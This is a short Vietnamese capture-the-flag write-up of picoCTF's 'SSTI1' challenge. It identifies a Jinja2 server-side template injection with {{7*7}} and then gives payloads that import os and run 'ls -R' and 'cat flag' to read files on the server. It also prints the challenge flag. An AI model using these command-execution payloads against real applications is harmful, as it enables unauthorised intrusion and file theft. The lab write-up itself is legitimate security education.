# SSTI1
Bài này sẽ cho chúng ta 1 trang web có chức năng nhập đơn giản.
![image](https://github.com/user-attachments/assets/bf50f943-d162-4728-879b-fc1c701a9b33)


Theo tên challenge, SSTI (Server-Side Template Injection) là một lỗ hổng web xảy ra khi kẻ tấn công có thể chèn đầu vào độc hại vào công cụ mẫu của ứng dụng web.

Ta thử nghiệm nhập các payload mẫu để xác định [template engine](https://expressjs.com/en/guide/using-template-engines.html#:~:text=A%20template%20engine%20enables%20you%20to%20use%20static,makes%20it%20easier%20to%20design%20an%20HTML%20page.) (trình biên dịch mẫu) đang được sử dụng là gì.

Sau một lúc thử thì ta biết được template engine được sử dụng cho trang web này là Jinja2 (Python).

Ta nhập payload:
``` python
{{7*7}}
```
Kết quả là :
![image](https://github.com/user-attachments/assets/479fd8cd-287a-460a-b80c-3fa2eb3ea6a5)


Được rồi, sau khi biết rằng website đang bị lỗi SSTI với template engine là Jinja2 (Python). Giờ ta sẽ nhập payload khai thác SSTI sau để xem toàn bộ file và thư mục trong thư mục hiện tại và tất cả các thư mục con.

``` python
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}
```

Kết quả là:

![image](https://github.com/user-attachments/assets/d4413cdf-2988-4e12-9fb6-69a96dc93fc1)


Sau khi có kết quả, ta đã nhìn thấy `flag`. 
Tiếp tục chèn payload để lấy flag.

``` python
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

Và ta có flag.

![image](https://github.com/user-attachments/assets/9c81ff9b-8a3c-4a48-9fda-6cab7b7d1f7b)


Flag: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}
